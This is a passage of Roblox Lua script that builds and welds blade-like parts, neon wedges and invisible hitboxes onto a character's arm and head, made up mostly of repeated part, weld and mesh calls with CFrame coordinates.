HandleBweld=weld(m,Character["Left Arm"],HandleB,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.228439331, 0.93026638, 0.0124473572, -4.32229936e-05, -3.26037371e-05, 0.99999994, 0, 0.999999762, 3.2633543e-05, -0.99999994, 0, -4.32229936e-05))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.Neon,0,0,"Institutional white","Wedge",Vector3.new(3.95000005, 0.200000048, 0.200000048))
Wedgeweld=weld(m,HandleB,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-2.68768501, -0.0389175415, 0.099748373, -0.999999881, -0.000124245867, 4.31585941e-05, 4.31585941e-05, -2.1014399e-12, 0.999999881, -0.000124245867, 0.999999762, 3.96104749e-09))
mesh("SpecialMesh",Wedge,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.379999995, 0.5))
mesh("SpecialMesh",HandleB,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(1.20000005, 0.25, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.175661087, -0.101444244, 0.00111961365, 0.865986586, -0.500067234, 5.71329329e-05, 0.500067234, 0.865986526, -4.08977285e-05, -2.90437747e-05, 6.40428188e-05, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Medium stone grey","Part",Vector3.new(1, 1, 2))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.499647141, 1.52587891e-05, 0.00108337402, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.5, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.188549042, 0.108885765, 0.00108909607, 0.865986586, -0.500067234, 5.71329329e-05, 0.500067234, 0.865986526, -4.08977285e-05, -2.90437747e-05, 6.40428188e-05, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.0440120697, 0.0439853668, 0.0011100769, 0.707264364, 0.706946552, 3.26992413e-05, -0.706946671, 0.707264364, -4.24305217e-05, -5.31027217e-05, 6.82158725e-06, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.389146805, -0.104288101, 0.00113677979, 0.965924382, -0.258824557, 4.95198256e-05, 0.258824557, 0.965924382, -4.27193881e-05, -3.67893808e-05, 5.40289911e-05, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Cyan","Part",Vector3.new(0.200000107, 0.200000018, 0.200000033))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.587745667, 1.90734863e-05, 0.00107955933, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.800000012, 0.600000024, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Really black","Part",Vector3.new(4.51999998, 0.300000012, 0.200000048))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.854496, -0.0399448872, 0.000982284546, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.600000024, 0.75999999))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.262313843, 0.151351929, 0.00113296509, 0.866146564, 0.499799311, 3.48026697e-05, -0.499799341, 0.866146445, -4.24137761e-05, -5.13857412e-05, 1.93684209e-05, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Light stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.68223381, -2.31266022e-05, 0.00113487244, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.280000001, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.102003098, -0.0588569641, 0.00109291077, 0.866146564, 0.499799311, 3.48026697e-05, -0.499799341, 0.866146445, -4.24137761e-05, -5.13857412e-05, 1.93684209e-05, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(0.200000048, 0.300000012, 0.299999952))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.630195618, -0.00102615356, -1.93119049e-05, 0.999999881, 6.32107185e-05, 7.89154292e-05, 7.89154292e-05, 3.9858099e-09, -0.999999881, -6.32107185e-05, 0.999999762, 1.32292555e-09))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.600000024, 0.899999976))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Light stone grey","Part",Vector3.new(0.200000048, 0.300000012, 0.300000042))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.502216339, -1.6450882e-05, 0.00112724304, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.400000006, 0.200000003, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.0538825989, -0.0311193466, 0.0011100769, 0.865986586, -0.500067234, 5.71329329e-05, 0.500067234, 0.865986526, -4.08977285e-05, -2.90437747e-05, 6.40428188e-05, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.417726517, 1.28746033e-05, 0.00106811523, 0.999999881, 2.98023224e-08, 4.3159529e-05, -1.86628313e-09, 0.999999821, -4.31849694e-05, -4.31595145e-05, 4.31807348e-05, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Light stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.582269669, -2.00271606e-05, 0.00113105774, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.Neon,0,0,"Institutional white","Wedge",Vector3.new(0.449999988, 0.200000048, 0.200000048))
Wedgeweld=weld(m,HandleB,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(4.80105019, -0.0301570892, 0.910226822, 0.984810233, -0.173634201, -3.186717e-05, -5.34346073e-05, -0.000119507618, -0.999999881, 0.173634231, 0.984810054, -0.000127013685))
mesh("SpecialMesh",Wedge,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.379999995, 0.5))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.Neon,0,0,"Institutional white","Wedge",Vector3.new(0.449999958, 0.200000048, 0.200000048))
Wedgeweld=weld(m,HandleB,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-4.80101013, -0.0339565277, 0.910427809, -0.984802961, 0.173674881, 4.78334514e-05, 3.63842737e-05, -6.91416062e-05, 0.99999994, 0.173674941, 0.984802961, 6.17822516e-05))
mesh("SpecialMesh",Wedge,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.379999995, 0.5))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.Neon,0,0,"Institutional white","Wedge",Vector3.new(3.95000005, 0.200000048, 0.200000048))
Wedgeweld=weld(m,HandleB,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.68768311, -0.0297698975, 0.0999081135, 0.999999881, 6.32107185e-05, 7.89154292e-05, 7.89154292e-05, 3.9858099e-09, -0.999999881, -6.32107185e-05, 0.999999762, 1.32292555e-09))
mesh("SpecialMesh",Wedge,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.379999995, 0.5))
HitboxB=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,1,"Really black","HitboxB",Vector3.new(4.65999985, 1.13, 0.200000048))
HitboxBweld=weld(m,HandleB,HitboxB,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.92450333, 0.0550560951, 0.000980377197, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",HitboxB,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.600000024, 0.75999999))

HandleC=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Medium stone grey","Handle",Vector3.new(1, 1, 1))
HandleCweld=weld(m,Character.Head,HandleC,CFrame.new(-5, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0, 1, 0, 4.32229936e-05, -3.26037371e-05, 0.99999994, 0, 0.999999762, 3.2633543e-05, -0.99999994, 0, -4.32229936e-05))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.Neon,0,0,"Institutional white","Wedge",Vector3.new(3.95000005, 0.200000048, 0.200000048))
Wedgeweld=weld(m,HandleC,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-2.68768311, -0.0389175415, 0.0997462273, -0.999999881, -0.000124245867, 4.31585941e-05, 4.31585941e-05, -2.1014399e-12, 0.999999881, -0.000124245867, 0.999999762, 3.96104749e-09))
mesh("SpecialMesh",Wedge,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.379999995, 0.5))
mesh("SpecialMesh",HandleC,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(1.20000005, 0.25, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleC,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.175661087, -0.101444244, 0.00111961365, 0.865986586, -0.500067234, 5.71329329e-05, 0.500067234, 0.865986526, -4.08977285e-05, -2.90437747e-05, 6.40428188e-05, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Medium stone grey","Part",Vector3.new(1, 1, 2))
Partweld=weld(m,HandleC,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.499647141, 1.52587891e-05, 0.00108337402, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.5, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleC,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.188549042, 0.108885765, 0.00108909607, 0.865986586, -0.500067234, 5.71329329e-05, 0.500067234, 0.865986526, -4.08977285e-05, -2.90437747e-05, 6.40428188e-05, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleC,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.0440139771, 0.0439872742, 0.0011100769, 0.707264364, 0.706946552, 3.26992413e-05, -0.706946671, 0.707264364, -4.24305217e-05, -5.31027217e-05, 6.82158725e-06, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleC,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.389144897, -0.104288101, 0.00113677979, 0.965924382, -0.258824557, 4.95198256e-05, 0.258824557, 0.965924382, -4.27193881e-05, -3.67893808e-05, 5.40289911e-05, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Cyan","Part",Vector3.new(0.200000107, 0.200000018, 0.200000033))
Partweld=weld(m,HandleC,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.587745667, 1.90734863e-05, 0.00107955933, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.800000012, 0.600000024, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Really black","Part",Vector3.new(4.51999998, 0.300000012, 0.200000048))
Partweld=weld(m,HandleC,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.854496, -0.0399444103, 0.000982284546, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.600000024, 0.75999999))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleC,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.262313843, 0.151351929, 0.00113296509, 0.866146564, 0.499799311, 3.48026697e-05, -0.499799341, 0.866146445, -4.24137761e-05, -5.13857412e-05, 1.93684209e-05, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Light stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleC,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.68223381, -2.31266022e-05, 0.00113487244, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.280000001, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleC,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.10200119, -0.0588569641, 0.00109291077, 0.866146564, 0.499799311, 3.48026697e-05, -0.499799341, 0.866146445, -4.24137761e-05, -5.13857412e-05, 1.93684209e-05, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(0.200000048, 0.300000012, 0.299999952))
Partweld=weld(m,HandleC,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.630195618, -0.00102615356, -1.93119049e-05, 0.999999881, 6.32107185e-05, 7.89154292e-05, 7.89154292e-05, 3.9858099e-09, -0.999999881, -6.32107185e-05, 0.999999762, 1.32292555e-09))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.600000024, 0.899999976))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Light stone grey","Part",Vector3.new(0.200000048, 0.300000012, 0.300000042))
Partweld=weld(m,HandleC,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.502216339, -1.6450882e-05, 0.00112724304, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.400000006, 0.200000003, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleC,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.0538845062, -0.0311193466, 0.0011100769, 0.865986586, -0.500067234, 5.71329329e-05, 0.500067234, 0.865986526, -4.08977285e-05, -2.90437747e-05, 6.40428188e-05, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleC,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.417726517, 1.28746033e-05, 0.00106811523, 0.999999881, 2.98023224e-08, 4.3159529e-05, -1.86628313e-09, 0.999999821, -4.31849694e-05, -4.31595145e-05, 4.31807348e-05, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Light stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleC,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.582269669, -1.95503235e-05, 0.00113105774, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.Neon,0,0,"Institutional white","Wedge",Vector3.new(0.449999988, 0.200000048, 0.200000048))
Wedgeweld=weld(m,HandleC,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(4.80104828, -0.0301551819, 0.910226822, 0.984810233, -0.173634201, -3.186717e-05, -5.34346073e-05, -0.000119507618, -0.999999881, 0.173634231, 0.984810054, -0.000127013685))
mesh("SpecialMesh",Wedge,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.379999995, 0.5))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.Neon,0,0,"Institutional white","Wedge",Vector3.new(0.449999958, 0.200000048, 0.200000048))
Wedgeweld=weld(m,HandleC,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-4.80100822, -0.0339546204, 0.910426855, -0.984802961, 0.173674881, 4.78334514e-05, 3.63842737e-05, -6.91416062e-05, 0.99999994, 0.173674941, 0.984802961, 6.17822516e-05))
mesh("SpecialMesh",Wedge,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.379999995, 0.5))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.Neon,0,0,"Institutional white","Wedge",Vector3.new(3.95000005, 0.200000048, 0.200000048))
Wedgeweld=weld(m,HandleC,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.68768311, -0.0297698975, 0.0999078751, 0.999999881, 6.32107185e-05, 7.89154292e-05, 7.89154292e-05, 3.9858099e-09, -0.999999881, -6.32107185e-05, 0.999999762, 1.32292555e-09))
mesh("SpecialMesh",Wedge,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.379999995, 0.5))
HitboxC=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,1,"Really black","HitboxC",Vector3.new(4.65999985, 1.13, 0.200000048))
HitboxCweld=weld(m,HandleC,HitboxC,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.92450333, 0.0550558567, 0.000980377197, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",HitboxC,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.600000024, 0.75999999))

HandleD=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Medium stone grey","Handle",Vector3.new(1, 1, 1))
HandleDweld=weld(m,Character.Head,HandleD,CFrame.new(5, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0, 1, 0, 4.32229936e-05, -3.26037371e-05, 0.99999994, 0, 0.999999762, 3.2633543e-05, -0.99999994, 0, -4.32229936e-05))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.Neon,0,0,"Institutional white","Wedge",Vector3.new(3.95000005, 0.200000048, 0.200000048))
Wedgeweld=weld(m,HandleD,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-2.68768311, -0.0389175415, 0.0997462273, -0.999999881, -0.000124245867, 4.31585941e-05, 4.31585941e-05, -2.1014399e-12, 0.999999881, -0.000124245867, 0.999999762, 3.96104749e-09))
mesh("SpecialMesh",Wedge,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.379999995, 0.5))
mesh("SpecialMesh",HandleD,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(1.20000005, 0.25, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleD,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.175661087, -0.101444244, 0.00111961365, 0.865986586, -0.500067234, 5.71329329e-05, 0.500067234, 0.865986526, -4.08977285e-05, -2.90437747e-05, 6.40428188e-05, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Medium stone grey","Part",Vector3.new(1, 1, 2))
Partweld=weld(m,HandleD,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.499647141, 1.52587891e-05, 0.00108337402, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.5, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleD,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.188549042, 0.108885765, 0.00108909607, 0.865986586, -0.500067234, 5.71329329e-05, 0.500067234, 0.865986526, -4.08977285e-05, -2.90437747e-05, 6.40428188e-05, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleD,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.0440139771, 0.0439872742, 0.0011100769, 0.707264364, 0.706946552, 3.26992413e-05, -0.706946671, 0.707264364, -4.24305217e-05, -5.31027217e-05, 6.82158725e-06, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleD,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.389144897, -0.104288101, 0.00113677979, 0.965924382, -0.258824557, 4.95198256e-05, 0.258824557, 0.965924382, -4.27193881e-05, -3.67893808e-05, 5.40289911e-05, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Cyan","Part",Vector3.new(0.200000107, 0.200000018, 0.200000033))
